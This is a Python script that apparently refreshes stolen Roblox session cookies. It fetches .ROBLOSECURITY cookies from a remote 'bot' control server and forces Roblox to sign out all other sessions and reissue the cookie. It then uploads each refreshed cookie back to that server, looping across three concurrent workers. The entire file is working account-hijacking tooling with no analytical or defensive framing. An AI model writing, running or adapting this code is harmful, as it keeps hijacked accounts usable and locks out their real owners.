
import re, asyncio, aiohttp
import os
import sys

APIKey = os.environ.get("UPLOAD_KEY")

if not APIKey:
    raise Exception("API_KEY environment variable not set")

headers = {
    "x-api-key": APIKey,
    "Content-Type": "application/json"
}

reauthcookieurl = "https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate"
xcsrfurl = "https://auth.roblox.com/v2/logout"
control_server = "http:///bots.bug.tools"

upload_url = control_server + "/api/upload_refreshed_cookie"



async def GetXSRFToken(Session, Cookie):
    async with Session.post(
        "https://auth.roblox.com/v1/logout", cookies={".ROBLOSECURITY": Cookie}
    ) as Response:
        XCSRF = Response.headers.get("x-csrf-token")
        if XCSRF:
            return XCSRF

async def RefreshCookie(Session, Cookie, XCSRFToken):
    async with Session.post(
        reauthcookieurl,
        cookies={'.ROBLOSECURITY': Cookie},
        headers={'X-CSRF-TOKEN': XCSRFToken}
    ) as response:
        setcookie = response.headers.get('set-cookie', '')
        match = re.search(r'\.ROBLOSECURITY=(.+?); domain=\.roblox\.com;', setcookie)
        if match:
            ROBLOSECURITY = match.group(1)
            return ROBLOSECURITY
        return None

async def RefreshTask(TaskId):
    while True: 
        async with aiohttp.ClientSession() as Session:
            async with Session.get(control_server + "/api/get_cookie_to_refresh", headers=headers) as resp:
                data = await resp.json()
                if data.get("IsEmpty"):
                    print(f"[Task {TaskId}] No cookies to refresh. Exiting.")
                    sys.exit(0)
                Cookie = data.get("Cookie")
                if not Cookie:
                    print(f"[Task {TaskId}] No cookie received from server. Exiting.")
                    sys.exit(1)

            XCSRFToken = await GetXSRFToken(Session, Cookie)
            if not XCSRFToken:
                print(f"[Task {TaskId}] Failed to get X-CSRF-TOKEN. Exiting.")
                sys.exit(1)

            RefreshedCookie = await RefreshCookie(Session, Cookie, XCSRFToken)
            if not RefreshedCookie:
                print(f"[Task {TaskId}] Failed to refresh cookie. Exiting.")
                sys.exit(1)

            payload = {"Cookie": RefreshedCookie}
            async with Session.post(upload_url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    print(f"[Task {TaskId}] Refreshed cookie uploaded successfully.")
                else:
                    print(f"[Task {TaskId}] Failed to upload refreshed cookie. Status: {resp.status}")
                    
        await asyncio.sleep(1)

async def Main():
    tasks = [asyncio.create_task(RefreshTask(i+1)) for i in range(3)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(Main())
